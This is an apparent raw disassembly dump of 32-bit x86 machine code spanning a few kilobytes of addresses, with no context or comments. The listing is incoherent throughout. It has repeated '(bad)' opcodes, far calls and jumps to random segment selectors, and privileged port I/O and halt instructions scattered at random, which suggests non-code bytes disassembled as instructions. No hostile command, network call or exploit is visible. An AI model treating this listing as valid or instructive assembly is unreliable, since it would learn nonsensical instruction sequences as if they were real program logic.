  428ae1:	xchg   DWORD PTR [edx+ebx*1],edi
  428ae4:	mov    dl,0xc6
  428ae6:	pop    ecx
  428ae7:	outs   dx,BYTE PTR ds:[esi]
  428ae8:	or     al,0x66
  428aea:	jnp    0x428aba
  428aec:	imul   ecx,DWORD PTR [ebx],0x3bee5d33
  428af2:	dec    esi
  428af3:	mov    ah,0xbd
  428af5:	inc    esp
  428af6:	mov    DWORD PTR [eax-0x15],ebx
  428af9:	ss call 0x1e23:0xc96427ba
  428b01:	or     dh,BYTE PTR [esp+ebp*2+0x498a9145]
  428b08:	add    bl,cl
  428b0a:	adc    DWORD PTR [ebx+0x3b1229b2],edx
  428b10:	fistp  DWORD PTR [ebx-0x4a]
  428b13:	push   edi
  428b14:	mov    edi,0x9fcdd10b
  428b19:	and    DWORD PTR [esp+ecx*2-0x6e65f201],eax
  428b20:	and    BYTE PTR [esi+0x624478d6],bl
  428b26:	test   al,0xa8
  428b28:	(bad)  
  428b2a:	xor    eax,0xc5ba9247
  428b2f:	mov    BYTE PTR [ebp-0x68],cl
  428b32:	call   0x8862:0x98aa3d3a
  428b39:	cmp    al,0xc
  428b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b3c:	inc    edi
  428b3d:	sub    al,0xe7
  428b3f:	and    BYTE PTR [edi-0x4a198eaa],cl
  428b45:	out    dx,eax
  428b46:	(bad)  
  428b47:	in     al,0x48
  428b49:	fmul   QWORD PTR [edx+0x15]
  428b4c:	sbb    eax,0x93a4f44f
  428b51:	lahf   
  428b52:	pop    esp
  428b53:	jno    0x428b01
  428b55:	push   esp
  428b56:	cmp    ah,BYTE PTR [ebx-0x79]
  428b59:	cwde   
  428b5a:	call   0xf091:0xbdd858c5
  428b61:	ret    0xb907
  428b64:	mov    eax,0xc962b910
  428b69:	mov    cl,0xe3
  428b6b:	shl    BYTE PTR es:[esp+eax*2],1
  428b6f:	arpl   WORD PTR [ebp+0x6ad099bf],di
  428b75:	adc    esp,DWORD PTR [esi-0xf]
  428b78:	fs fucomi st,st(3)
  428b7b:	pop    eax
  428b7c:	stc    
  428b7d:	aaa    
  428b7e:	mov    ds:0x1398b5a5,al
  428b83:	les    esp,FWORD PTR [esi-0x65]
  428b86:	sar    DWORD PTR [esi],cl
  428b88:	mov    al,ds:0xc1179a0e
  428b8d:	pusha  
  428b8e:	mov    ?,esp
  428b90:	mov    eax,0x7dbba172
  428b95:	cmc    
  428b96:	inc    ecx
  428b97:	addr16 mov esp,0x987930fa
  428b9d:	retf   0xa91
  428ba0:	push   cs
  428ba1:	or     BYTE PTR [ecx+0x4a14cc20],bh
  428ba7:	retf   0x92f4
  428baa:	sub    eax,0x19ff34a7
  428baf:	cwde   
  428bb0:	iret   
  428bb1:	icebp  
  428bb2:	ficomp WORD PTR [edi+0x39998c8]
  428bb8:	outs   dx,BYTE PTR ds:[esi]
  428bb9:	sbb    eax,0xd96bed5a
  428bbe:	mov    eax,0x4bf22527
  428bc3:	pushf  
  428bc4:	cmp    eax,0xaa0e4e3
  428bc9:	adc    BYTE PTR [ebp-0x7e],dh
  428bcc:	(bad)  
  428bcd:	cli    
  428bce:	adc    BYTE PTR [eax+ebx*4+0x2b],ch
  428bd2:	aam    0xb9
  428bd4:	mov    dl,0xea
  428bd6:	push   0xffffffce
  428bd8:	and    cl,BYTE PTR [edx+0x62]
  428bdb:	adc    ch,dl
  428bdd:	or     esp,DWORD PTR [ebp+0x49]
  428be0:	int    0xc2
  428be2:	(bad)  
  428be4:	xlat   BYTE PTR ds:[ebx]
  428be5:	sub    ebx,DWORD PTR [edx-0x3ba80688]
  428beb:	mov    dl,BYTE PTR [ecx]
  428bed:	ficomp WORD PTR [ecx+0x60]
  428bf0:	and    ch,ch
  428bf2:	imul   eax,DWORD PTR [edi-0x40bcde20],0xffffffaa
  428bf9:	jne    0x428c10
  428bfb:	jmp    0xbf2:0x41f1dc98
  428c02:	out    dx,al
  428c03:	out    dx,al
  428c04:	push   0x58
  428c06:	xchg   esi,eax
  428c07:	lods   eax,DWORD PTR ds:[esi]
  428c08:	hlt    
  428c09:	fisub  DWORD PTR [ebx-0x55f5379a]
  428c0f:	dec    ebx
  428c10:	pause  
  428c12:	dec    edx
  428c13:	mov    WORD PTR [esi+0x61],ss
  428c16:	(bad)  
  428c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c18:	dec    eax
  428c19:	mov    dh,0xf8
  428c1b:	fldcw  WORD PTR [ecx+edi*8-0xf4d6eaf]
  428c22:	pop    edi
  428c23:	jp     0x428bc4
  428c25:	mov    edi,0xdf673b4
  428c2a:	jge    0x428bf5
  428c2c:	and    BYTE PTR [edx+eiz*4-0x34194ac5],bl
  428c33:	in     eax,0xe
  428c35:	in     eax,dx
  428c36:	sub    eax,0xf602e2c3
  428c3b:	push   edi
  428c3c:	add    ch,BYTE PTR [edi]
  428c3e:	mov    esi,0x5205876b
  428c43:	(bad)  
  428c44:	mov    eax,0x13a736b4
  428c49:	mov    eax,ds:0x9562cd88
  428c4e:	bound  edi,QWORD PTR [eax]
  428c50:	(bad)  
  428c51:	out    dx,al
  428c52:	cdq    
  428c53:	push   ebp
  428c54:	pop    ss
  428c55:	outs   dx,BYTE PTR ds:[esi]
  428c56:	ret    0x10f9
  428c59:	mov    ds:0xba1768b,eax
  428c5e:	push   ecx
  428c5f:	fst    DWORD PTR [ebx+0x37cbee42]
  428c65:	gs call 0x1bb9:0xce2050d
  428c6d:	xlat   BYTE PTR ds:[ebx]
  428c6e:	out    0xa7,eax
  428c70:	out    0xb6,eax
  428c72:	inc    ebp
  428c73:	mov    eax,ds:0x8e3b9397
  428c78:	mov    dl,0x97
  428c7a:	mov    BYTE PTR [bp-0x5de1],dh
  428c7f:	cmpxchg DWORD PTR [ebx],ecx
  428c82:	and    eax,0xa6b6b03d
  428c87:	adc    al,0x97
  428c89:	daa    
  428c8a:	call   0xf8fd:0x86b5f27f
  428c91:	outs   dx,DWORD PTR ds:[esi]
  428c92:	fstp   QWORD PTR [esi-0x1be50584]
  428c98:	jp     0x428c65
  428c9a:	repz ret 0x841b
  428c9e:	popf   
  428c9f:	ins    BYTE PTR es:[edi],dx
  428ca0:	pop    ds
  428ca1:	mov    fs:0x74fee25d,eax
  428ca7:	pop    esp
  428ca8:	xor    eax,0xd481cb04
  428cad:	lea    edi,[ebx]
  428caf:	fisubr DWORD PTR [edx+0x40]
  428cb2:	into   
  428cb3:	jae    0x428ce8
  428cb5:	mov    al,0x84
  428cb7:	mov    ebp,0x4548b99f
  428cbc:	mov    dl,0x7a
  428cbe:	or     ah,ch
  428cc0:	xor    DWORD PTR ds:0xd3e8a4ed,edx
  428cc6:	jae    0x428c89
  428cc8:	push   ebx
  428cc9:	fistp  QWORD PTR [edx]
  428ccb:	add    WORD PTR [edx+ebx*4+0x7d02d8d8],ax
  428cd3:	mov    esi,0xa77fd5d1
  428cd8:	jmp    0x428cad
  428cda:	mov    esp,0xc9feb8bf
  428cdf:	leave  
  428ce0:	scas   eax,DWORD PTR es:[edi]
  428ce1:	test   al,0xc7
  428ce3:	xchg   ebx,eax
  428ce4:	jne    0x428d01
  428ce6:	mov    ch,0xe6
  428ce8:	push   edx
  428ce9:	xchg   edi,eax
  428cea:	ins    BYTE PTR es:[edi],dx
  428ceb:	xor    al,0x67
  428ced:	or     BYTE PTR [edi+0x2e],dh
  428cf0:	or     bl,BYTE PTR [edi+0x30]
  428cf3:	mov    esp,0xd440eb3a
  428cf8:	mov    dh,0x3
  428cfa:	out    dx,al
  428cfb:	leave  
  428cfc:	and    al,0xb9
  428cfe:	pop    ecx
  428cff:	xchg   esp,eax
  428d00:	or     bl,dh
  428d02:	mov    ?,WORD PTR [ebp+0x5a0f0bc7]
  428d08:	jno    0x428ca4
  428d0a:	outs   dx,DWORD PTR ds:[esi]
  428d0b:	imul   esi,DWORD PTR [esi-0x30a23d9f],0xdc54c90b
  428d15:	ret    0xc166
  428d18:	nop
  428d19:	or     eax,DWORD PTR [ebx-0x52]
  428d1c:	cld    
  428d1d:	mov    dl,0x34
  428d1f:	jns    0x428d08
  428d21:	and    esi,DWORD PTR [edx+0x5]
  428d24:	mov    dl,0x4
  428d26:	sbb    dh,dh
  428d28:	cwde   
  428d29:	je     0x428d41
  428d2b:	dec    edx
  428d2c:	jns    0x428d63
  428d2e:	sti    
  428d2f:	data16 mov dl,0x76
  428d32:	(bad)  
  428d33:	or     al,0xd2
  428d35:	loope  0x428d9e
  428d37:	dec    eax
  428d38:	mov    dl,0x2
  428d3a:	nop
  428d3b:	sub    eax,0xffe1086
  428d40:	push   edi
  428d41:	or     esi,edx
  428d43:	inc    eax
  428d44:	sbb    eax,ebp
  428d46:	xchg   ebp,eax
  428d47:	popf   
  428d48:	jmp    0xbf0b:0x4337a193
  428d4f:	std    
  428d50:	push   cs
  428d51:	inc    ecx
  428d52:	retf   0x3868
  428d55:	or     ebp,edi
  428d57:	imul   ecx,DWORD PTR [eax],0x77
  428d5a:	in     al,dx
  428d5b:	pusha  
  428d5c:	fisttp WORD PTR [eax-0x66]
  428d5f:	cli    
  428d60:	dec    edi
  428d61:	push   eax
  428d62:	sub    eax,0x23f5665c
  428d67:	ror    BYTE PTR [edi-0x569077f5],cl
  428d6d:	sbb    BYTE PTR [ecx-0x65ad53f7],ch
  428d73:	clc    
  428d74:	mov    esp,0x6d13ec46
  428d79:	nop
  428d7a:	jge    0x428d4e
  428d7c:	aaa    
  428d7d:	or     esi,esp
  428d7f:	jmp    0x7288fddf
  428d84:	std    
  428d85:	dec    edx
  428d86:	call   0x6506:0x5136c10f
  428d8d:	ins    DWORD PTR es:[di],dx
  428d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d90:	cmc    
  428d91:	imul   edi,DWORD PTR [eax],0x57
  428d94:	pop    ecx
  428d95:	mov    ah,0x3f
  428d97:	dec    ebx
  428d98:	mov    dl,0x18
  428d9a:	stos   BYTE PTR es:[edi],al
  428d9b:	mov    ebx,0xb9ab93fb
  428da0:	dec    DWORD PTR [ecx+ecx*8]
  428da3:	and    eax,0x878ceaa8
  428da8:	ror    DWORD PTR [eax-0x3753f014],1
  428dae:	ret    0x3210
  428db1:	add    al,0xa9
  428db3:	inc    ecx
  428db4:	xlat   BYTE PTR ds:[ebx]
  428db5:	jae    0x428e0d
  428db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428db8:	aad    0x26
  428dba:	dec    ecx
  428dbb:	pop    ebp
  428dbc:	pop    esi
  428dbd:	pop    ds
  428dbe:	or     dl,ah
  428dc0:	int3   
  428dc1:	imul   ebx,DWORD PTR [edx+0x54ace48],0x76
  428dc8:	cdq    
  428dc9:	jbe    0x428e13
  428dcb:	popf   
  428dcc:	jmp    0xc390:0x18cb9a73
  428dd3:	mov    ah,0x72
  428dd5:	mov    ch,0x9b
  428dd7:	xchg   BYTE PTR [ebx+0x49],ch
  428dda:	aad    0x9b
  428ddc:	cmp    BYTE PTR [ebp-0x6],ch
  428ddf:	je     0x428e14
  428de1:	xchg   ebx,eax
  428de2:	xchg   ebx,eax
  428de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428de4:	rcl    DWORD PTR [ebx-0x3d],1
  428de7:	ffree  st(1)
  428de9:	iret   
  428dea:	(bad)  
  428deb:	ret    
  428dec:	mov    dl,0x1b
  428dee:	inc    ebp
  428def:	cdq    
  428df0:	addr16 inc eax
  428df2:	int3   
  428df3:	mov    eax,0x5f190bfb
  428df8:	push   ecx
  428df9:	sbb    BYTE PTR [ebx],al
  428dfb:	enter  0xcf11,0x9a
  428dff:	out    0xaa,al
  428e01:	pop    ss
  428e02:	clc    
  428e03:	mov    edx,0xa82d6b80
  428e08:	xchg   edi,eax
  428e09:	mov    ah,0x62
  428e0b:	int    0xf2
  428e0d:	and    DWORD PTR es:[eax+0x6b919628],eax
  428e14:	in     eax,0x9c
  428e16:	shl    BYTE PTR [edi],cl
  428e18:	push   ebp
  428e19:	push   edx
  428e1a:	jnp    0x428e88
  428e1c:	(bad)  
  428e1d:	or     esp,DWORD PTR [eax]
  428e1f:	rol    DWORD PTR [eax],1
  428e21:	enter  0xba7d,0x69
  428e25:	mov    al,ds:0x3caccc9a
  428e2a:	retf   0x2a4
  428e2d:	or     BYTE PTR cs:[ebp-0x589fd7c6],dh
  428e34:	in     eax,0x4d
  428e36:	pop    edi
  428e37:	arpl   WORD PTR [ecx-0x4a],di
  428e3a:	call   0xc723:0x6450518b
  428e41:	out    dx,eax
  428e42:	and    BYTE PTR [edi-0x221676d],ah
  428e48:	loop   0x428ea2
  428e4a:	loopne 0x428e11
  428e4c:	int    0x4d
  428e4e:	call   0x64f3:0x82fa17f5
  428e55:	les    eax,FWORD PTR [ebx]
  428e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e58:	mov    eax,0xd1e8afe9
  428e5d:	mov    eax,ds:0x6eb272fa
  428e62:	cwde   
  428e63:	add    BYTE PTR ds:0x4fb41062,dh
  428e69:	or     esi,DWORD PTR [esp+eiz*2+0x5dc570f4]
  428e70:	xor    BYTE PTR [eax],bh
  428e72:	popf   
  428e73:	cmovae ebp,DWORD PTR ds:0x8bd27a56
  428e7a:	nop
  428e7b:	push   edi
  428e7c:	fwait
  428e7d:	or     eax,DWORD PTR [ebx+edi*8-0x78]
  428e81:	and    DWORD PTR ds:0x6847b301,ecx
  428e87:	and    al,0xb2
  428e89:	inc    ecx
  428e8a:	or     al,0x93
  428e8c:	jbe    0x428ef0
  428e8e:	push   esp
  428e8f:	sbb    DWORD PTR [ebx+ecx*1-0x34],0xffffffc8
  428e94:	mov    edx,0x38b80dbd
  428e99:	hlt    
  428e9a:	cwde   
  428e9b:	mov    ds:0xf94a0ac2,eax
  428ea0:	xor    al,ch
  428ea2:	sbb    DWORD PTR [eax],0xffffffe2
  428ea5:	dec    ebx
  428ea6:	inc    eax
  428ea7:	js     0x428f25
  428ea9:	adc    eax,0x8ba1dbb3
  428eae:	inc    esi
  428eaf:	push   cs
  428eb0:	jns    0x428f1b
  428eb2:	nop
  428eb3:	fbstp  TBYTE PTR [edx+0x2f893c20]
  428eb9:	inc    edx
  428eba:	or     edi,DWORD PTR [ecx-0x6d]
  428ebd:	or     edi,edi
  428ebf:	xchg   ebx,eax
  428ec0:	(bad)  
  428ec1:	hlt    
  428ec2:	imul   ebx,DWORD PTR ds:0x2e9aaa94,0x2e
  428ec9:	jp     0x428f09
  428ecb:	adc    BYTE PTR [ebp*2-0xc5c5845],bh
  428ed2:	stos   DWORD PTR es:[edi],eax
  428ed3:	mov    ebx,0x78bf26fa
  428ed8:	mov    dl,0x6e
  428eda:	dec    esi
  428edb:	test   BYTE PTR [eax+0x67],al
  428ede:	xor    esi,DWORD PTR [eax]
  428ee0:	xchg   esp,eax
  428ee1:	imul   DWORD PTR [eax]
  428ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ee4:	mov    ecx,ds
  428ee6:	fs call 0x320e:0xd704d096
  428eee:	call   0x17f:0x8c553093
  428ef5:	xor    edx,DWORD PTR [ebp+0x465fa5a7]
  428efb:	mov    bh,0xd0
  428efd:	push   ebx
  428efe:	xor    al,0xf1
  428f00:	mov    dl,0x5b
  428f02:	sbb    ecx,DWORD PTR [ecx+0x21c0ffe0]
  428f08:	or     al,0x73
  428f0a:	xchg   esp,eax
  428f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f0c:	pop    ecx
  428f0d:	lock dec esp
  428f0f:	outs   dx,WORD PTR ds:[esi]
  428f11:	retf   
  428f12:	jp     0x428ea0
  428f14:	mov    ebp,0x14bfee56
  428f19:	imul   eax,DWORD PTR [eax+0xa],0x1b
  428f1d:	mov    dh,0x65
  428f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f20:	jns    0x428f9d
  428f22:	ins    DWORD PTR es:[edi],dx
  428f23:	cld    
  428f24:	mov    cx,0x5a83
  428f28:	mov    dl,0x93
  428f2a:	mov    ds:0x42fddb5b,al
  428f2f:	push   ebp
  428f30:	stc    
  428f31:	jecxz  0x428f30
  428f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f34:	cmp    eax,0x809421d2
  428f39:	cmp    al,0x4d
  428f3b:	adc    al,0xb2
  428f3d:	cmp    cl,BYTE PTR [ebx+0x2ce454da]
  428f43:	jecxz  0x428f02
  428f45:	push   ebx
  428f46:	inc    eax
  428f47:	jmp    0xa996:0xadc211b2
  428f4e:	xlat   BYTE PTR ds:[ebx]
  428f4f:	loopne 0x428ed9
  428f51:	bound  ebx,QWORD PTR [eax]
  428f53:	sub    DWORD PTR [edx-0x43],esi
  428f56:	mov    ds:0xad5b7987,al
  428f5b:	ds lahf 
  428f5d:	add    al,0x16
  428f5f:	out    0x55,al
  428f61:	push   esi
  428f62:	jp     0x428fcf
  428f64:	mov    edx,0xb2668b65
  428f69:	inc    ebp
  428f6a:	add    BYTE PTR [edi-0x5bda8186],0x7
  428f71:	or     ebx,DWORD PTR ds:0x1e698ad5
  428f77:	dec    edx
  428f78:	push   esp
  428f79:	pusha  
  428f7a:	call   0xf87b:0x24a4486d
  428f81:	mov    edx,0xb86551f
  428f86:	push   ebx
  428f87:	fs das 
  428f89:	loope  0x428fd0
  428f8b:	inc    edi
  428f8c:	fs in  eax,0x9b
  428f8f:	ficomp WORD PTR [ebx]
  428f91:	inc    ebp
  428f92:	cmp    BYTE PTR [ebp+0x12],dh
  428f95:	clc    
  428f96:	dec    edx
  428f97:	or     al,0x6
  428f99:	or     eax,edi
  428f9b:	push   edi
  428f9c:	rol    edx,0xae
  428f9f:	mov    ebx,0xfea39f5a
  428fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fa5:	add    al,0x94
  428fa7:	jp     0x429005
  428fa9:	jmp    0xc65e:0x2e6e64d7
  428fb0:	jo     0x428fbc
  428fb2:	cmp    DWORD PTR [ebx-0x658f9af3],eax
  428fb8:	xor    bh,bl
  428fba:	mov    esp,0x4797ac86
  428fbf:	xor    al,0x71
  428fc1:	lods   al,BYTE PTR ds:[esi]
  428fc2:	mov    ?,WORD PTR [eax]
  428fc4:	jae    0x428f59
  428fc6:	scas   al,BYTE PTR es:[edi]
  428fc7:	inc    edi
  428fc8:	mov    ebx,0x2009dd31
  428fcd:	dec    esi
  428fce:	shl    DWORD PTR [edi-0x3d7e43a0],0x63
  428fd5:	mov    ds:0x3b342c9a,eax
  428fda:	xchg   ecx,eax
  428fdb:	(bad)
  428fdf:	test   eax,0xb88ea5d8
  428fe4:	rcr    BYTE PTR [esp+ecx*4-0x6457d152],cl
  428feb:	push   0x3c5931c8
  428ff0:	jb     0x428fd0
  428ff2:	jmp    0x8b11:0xe413acd4
  428ff9:	sbb    eax,0x5acc35cc
  428ffe:	call   0x457e:0x8bea14b5
  429005:	in     al,0x8d
  429007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429008:	mov    edi,0x955445c6
  42900d:	repnz stc 
  42900f:	mov    al,ds:0x9cc33eb3
  429014:	(bad)  
  429015:	outs   dx,BYTE PTR ds:[esi]
  429016:	mov    bh,0x35
  429018:	jb     0x428fe1
  42901a:	fisub  WORD PTR [esi-0x68995205]
  429020:	cmc    
  429021:	sub    al,0xd0
  429023:	push   edi
  429024:	inc    ebx
  429026:	call   0xd959:0xc6ff0021
  42902d:	inc    esp
  42902e:	pop    edx
  42902f:	mov    al,ds:0xfd6259a2
  429034:	lock cwde 
  429036:	add    al,0x13
  429038:	dec    edx
  429039:	cmp    edx,esp
  42903b:	je     0x428fef
  42903d:	and    eax,0x67d40da8
  429042:	or     eax,0xcb0bedba
  429047:	sub    BYTE PTR [edx],ah
  429049:	mov    ebx,0xf8205b06
  42904e:	sar    bh,cl
  429050:	ja     0x42905d
  429052:	aas    
  429053:	or     BYTE PTR [esp+ebx*2+0xb99f350],dl
  42905a:	cwde   
  42905b:	and    BYTE PTR [ecx+0x16bf9c56],ah
  429061:	mov    eax,ds:0xf028439d
  429066:	das    
  429067:	add    dl,BYTE PTR [ebx]
  429069:	nop
  42906a:	xor    bh,BYTE PTR [ecx-0x5889a4ba]
  429070:	cli    
  429071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429072:	imul   edi,DWORD PTR [ecx],0x5cedaca1
  429078:	mov    dl,0x58
  42907a:	inc    ebx
  42907b:	js     0x4290fc
  42907d:	push   ss
  42907e:	mov    al,0x33
  429080:	mov    ebp,gs
  429082:	jne    0x42902b
  429084:	les    esi,FWORD PTR [ebp+0x5d120517]
  42908a:	les    ebx,FWORD PTR [edx-0x4e]
  42908d:	pop    edi
  42908e:	adc    BYTE PTR [eax-0x6e],0xfe
  429092:	mov    esp,0xc70bb9e7
  429097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429098:	mov    ch,0xf1
  42909a:	paddq  mm5,QWORD PTR [esi+edx*8]
  42909e:	bound  ebx,QWORD PTR [edx+esi*4]
  4290a1:	or     eax,0xa862afd4
  4290a6:	out    0x64,al
  4290a8:	ds jns 0x429095
  4290ab:	adc    DWORD PTR [ebx],0x38
  4290ae:	outs   dx,DWORD PTR ds:[esi]
  4290af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290b0:	sbb    eax,0x8a63632b
  4290b5:	mov    al,ds:0xd0682e95
  4290ba:	loop   0x429071
  4290bc:	mov    dl,0xdf
  4290be:	stos   DWORD PTR es:[edi],eax
  4290bf:	jg     0x4290cc
  4290c1:	retf   
  4290c2:	pushf  
  4290c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290c4:	jns    0x4290c6
  4290c6:	mov    eax,0x1137208e
  4290cb:	loop   0x42907b
  4290cd:	pop    esp
  4290ce:	and    ah,BYTE PTR [ecx+0x73]
  4290d1:	and    BYTE PTR [esi],dh
  4290d3:	fld1   
  4290d5:	adc    edx,ebp
  4290d7:	(bad)  
  4290d8:	dec    ecx
  4290d9:	or     ebx,esi
  4290db:	mov    ecx,0x6a63e166
  4290e0:	jbe    0x429125
  4290e2:	call   0xe4f6462f
  4290e7:	hlt    
  4290e8:	repnz loop 0x429075
  4290eb:	call   0xa82e588a
  4290f0:	shl    edx,0xaf
  4290f3:	into   
  4290f4:	jb     0x4290fe
  4290f6:	movd   mm2,DWORD PTR [esp+edi*2-0x77]
  4290fb:	mov    dh,0x5a
  4290fd:	sub    eax,0xddc9fc9b
  429102:	(bad)  [edx+eax*8-0xc]
  429106:	fld    QWORD PTR [ecx+0x6b]
  429109:	or     ebp,DWORD PTR [esi]
  42910b:	add    al,0xe8
  42910d:	push   ds
  42910e:	sti    
  42910f:	lods   al,BYTE PTR ds:[esi]
  429110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429111:	cdq    
  429112:	xchg   BYTE PTR [edi],dh
  429114:	push   DWORD PTR [eax-0x66]
  429117:	xchg   esp,eax
  429118:	in     eax,dx
  429119:	out    0x82,eax
  42911b:	add    eax,0x4f930b1a
  429120:	add    ecx,esp
  429122:	fdiv   st(3),st
  429124:	mov    eax,0x25cf9abf
  429129:	or     eax,0x6cc2f7ee
  42912e:	jno    0x429162
  429130:	xor    bl,BYTE PTR [esi]
  429132:	dec    eax
  429133:	dec    edx
  429134:	loope  0x42911a
  429136:	jb     0x42915d
  429138:	mov    dl,0xa5
  42913a:	pop    ss
  42913b:	add    ebp,ebp
  42913d:	xchg   ebx,eax
  42913e:	add    BYTE PTR [esi],dl
  429140:	mov    ebp,0x9ac7670b
  429145:	xchg   edi,eax
  429146:	test   eax,esi
  429148:	dec    ebx
  429149:	ror    DWORD PTR [eax-0x652624e4],cl
  42914f:	leave  
  429150:	adc    al,0x8b
  429152:	mov    bl,0xb3
  429154:	mov    BYTE PTR ds:0x6488d530,dh
  42915a:	call   0x4d60d606
  42915f:	dec    ebx
  429160:	inc    esi
  429161:	bound  ecx,QWORD PTR [ebp-0x6c7eb56c]
  429167:	test   DWORD PTR [ecx+0x1a],ebp
  42916a:	loop   0x429166
  42916c:	mov    ch,0x18
  42916e:	mov    edx,0x5eac79e7
  429173:	sbb    BYTE PTR [edx-0x707feb00],dh
  429179:	fidiv  DWORD PTR [ecx]
  42917b:	fstp   st(0)
  42917d:	or     ecx,ebp
  42917f:	cmc    
  429180:	lahf   
  429181:	adc    eax,0x7fe7dc74
  429186:	mov    ah,0x5f
  429188:	mov    esi,0x430e9938
  42918d:	and    BYTE PTR [ecx],ah
  42918f:	aaa    
  429190:	(bad)  
  429192:	aas    
  429193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429194:	adc    esp,DWORD PTR [esp+ebx*2+0x14489181]
  42919b:	sub    al,0xb2
  42919d:	ss adc esi,ecx
  4291a0:	addr16 push 0xbbd97be
  4291a6:	dec    ebx
  4291a7:	mov    ebp,0x71534feb
  4291ac:	je     0x4291cc
  4291ae:	xchg   BYTE PTR [edi*2+0x174fd8fc],bl
  4291b5:	shr    BYTE PTR [ebx-0x29261839],0xa7
  4291bc:	adc    bh,BYTE PTR [esi+0x71]
  4291bf:	xor    eax,0x958a7019
  4291c4:	mov    dl,0x20
  4291c6:	neg    BYTE PTR [edi+0x74d785ee]
  4291cc:	rcl    DWORD PTR [edi],1
  4291ce:	js     0x42923a
  4291d0:	fild   WORD PTR [edi-0x1a]
  4291d3:	scas   al,BYTE PTR es:[edi]
  4291d4:	aam    0x31
  4291d6:	mov    DWORD PTR [edx+0x2f85111b],esi
  4291dc:	jb     0x42919c
  4291de:	mov    ebx,0x42b7a089
  4291e3:	mov    ch,0xd8
  4291e5:	(bad)  
  4291e6:	push   ds
  4291e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4291e8:	push   0x9
  4291ea:	ds dec ecx
  4291ec:	sub    ebx,edi
  4291ee:	out    0xea,eax
  4291f0:	mov    dl,0xff
  4291f2:	push   eax
  4291f3:	dec    edx
  4291f4:	rol    DWORD PTR [esi-0x6d0005f],1
  4291fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4291fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4291fc:	xor    ebp,DWORD PTR [edi-0x33230627]
  429202:	stos   BYTE PTR es:[edi],al
  429203:	lahf   
  429204:	add    dh,ah
  429206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429207:	xchg   ecx,eax
  429208:	jnp    0x4291fe
  42920a:	call   0x162f:0x766df799
  429211:	cmp    cl,BYTE PTR [eax+esi*4-0x22]
  429215:	or     DWORD PTR [eax],esp
  429217:	mov    al,ds:0xd7250f4a
  42921c:	jmp    0x94c1:0xb2892a4c
  429223:	add    al,BYTE PTR [eax]
  429225:	dec    edx
  429226:	pop    es
  429227:	xor    bh,cl
  429229:	add    al,0xb
  42922b:	popa   
  42922c:	xor    eax,0xa723fa4d
  429231:	je     0x42926a
  429233:	add    BYTE PTR [edx+0x635f1268],dh
  429239:	test   BYTE PTR [edx+0x1e],dl
  42923c:	or     DWORD PTR [ebx],0xf9bfc88d
  429242:	sub    eax,0x9a946163
  429247:	xchg   ecx,eax
  429248:	shl    BYTE PTR [ecx-0x40ae35db],0x62
  42924f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429250:	push   ebx
  429251:	pushf  
  429252:	icebp  
  429253:	fsub   DWORD PTR [ebx-0x6a]
  429256:	jecxz  0x42924d
  429258:	mov    dl,0x92
  42925a:	aaa    
  42925b:	sub    DWORD PTR [esi-0x8e1a2ff],edi
  429261:	or     dh,dh
  429263:	sbb    dl,dl
  429265:	jnp    0x42925a
  429267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429268:	ror    DWORD PTR [ebx+0x60],1
  42926b:	ja     0x4292e1
  42926d:	cmp    DWORD PTR [edx-0x247d1861],ebx
  429273:	fstp   QWORD PTR [eax]
  429275:	add    DWORD PTR [eax-0x59],0x5a3bf266
  42927c:	mov    eax,DWORD PTR [ebp+0x3a]
  42927f:	enter  0xb7b2,0x34
  429283:	push   ss
  429284:	inc    eax
  429285:	push   ebx
  429286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429287:	add    BYTE PTR [ebx-0x6c4e6af5],0xce
  42928e:	pop    ss
  42928f:	scas   al,BYTE PTR es:[edi]
  429290:	arpl   WORD PTR [edi-0x5a],dx
  429293:	ss test al,0x8b
  429296:	fucom  st(3)
  429298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429299:	jge    0x429316
  42929b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42929c:	inc    ebp
  42929d:	or     edx,DWORD PTR ds:0x468afbf7
  4292a3:	adc    eax,eax
  4292a5:	popa   
  4292a6:	call   0xa7e7:0x2eec073b
  4292ad:	fadd   DWORD PTR [ecx-0x47]
  4292b0:	inc    esi
  4292b1:	push   ebp
  4292b2:	push   0xad629fa7
  4292b7:	xor    al,0x4a
  4292b9:	xchg   ebp,eax
  4292ba:	call   0xd9e5:0xf5b5d3f7
  4292c1:	jnp    0x4292d1
  4292c3:	fcmovbe st,st(7)
  4292c5:	or     edx,DWORD PTR [ebx]
  4292c7:	add    al,0x42
  4292c9:	pop    ss
  4292ca:	jmp    0x9a7e682b
  4292cf:	and    dh,cl
  4292d1:	pop    ecx
  4292d2:	out    0x15,al
  4292d4:	push   esp
  4292d5:	mov    esp,0xda21b90c
  4292da:	js     0x4292c3
  4292dc:	fdiv   st(2),st
  4292de:	xor    esi,ebx
  4292e0:	fsub   DWORD PTR [edx-0x44615763]
  4292e6:	push   esp
  4292e7:	push   0x3b102882
